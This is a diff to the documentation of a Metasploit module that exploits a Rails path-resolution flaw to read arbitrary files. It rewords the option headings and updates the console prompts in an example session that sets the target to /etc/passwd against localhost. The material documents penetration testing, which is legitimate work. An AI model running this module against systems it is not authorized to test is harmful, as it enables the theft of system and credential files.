@@ -18,11 +18,11 @@
 
 ## Options
 
-  **ROUTE**
+### ROUTE
 
   This is a web path or "route" on the vulnerable server. Since the vulnerability lies within the PathResolver of Rails, the route should be in the server's routes.rb file. 
 
-  **TARGET_FILE**
+### TARGET_FILE
 
   This is the file to be read on the remote server. This *must* be an absolute path (eg. /etc/passwd).
 
@@ -38,8 +38,8 @@
 
 
   ```
-msf5 > use auxiliary/gather/rails_doubletap_file_read
-msf5 auxiliary(gather/rails_doubletap_file_read) > options
+msf > use auxiliary/gather/rails_doubletap_file_read
+msf auxiliary(gather/rails_doubletap_file_read) > options
 
 Module options (auxiliary/gather/rails_doubletap_file_read):
 
@@ -53,13 +53,13 @@ Module options (auxiliary/gather/rails_doubletap_file_read):
    TARGET_FILE  /etc/passwd      yes       The absolute path of remote file to read.
    VHOST                         no        HTTP server virtual host
 
-msf5 auxiliary(gather/rails_doubletap_file_read) > set RHOSTS localhost
+msf auxiliary(gather/rails_doubletap_file_read) > set RHOSTS localhost
 RHOSTS => localhost
-msf5 auxiliary(gather/rails_doubletap_file_read) > set RPORT 8000
+msf auxiliary(gather/rails_doubletap_file_read) > set RPORT 8000
 RPORT => 8000
-smsf5 auxiliary(gather/rails_doubletap_file_read) > set ROUTE /demo
+smsf auxiliary(gather/rails_doubletap_file_read) > set ROUTE /demo
 ROUTE => /demo
-msf5 auxiliary(gather/rails_doubletap_file_read) > run
+msf auxiliary(gather/rails_doubletap_file_read) > run
 [*] Running module against 127.0.0.1
 
 [+] Target is vulnerable!
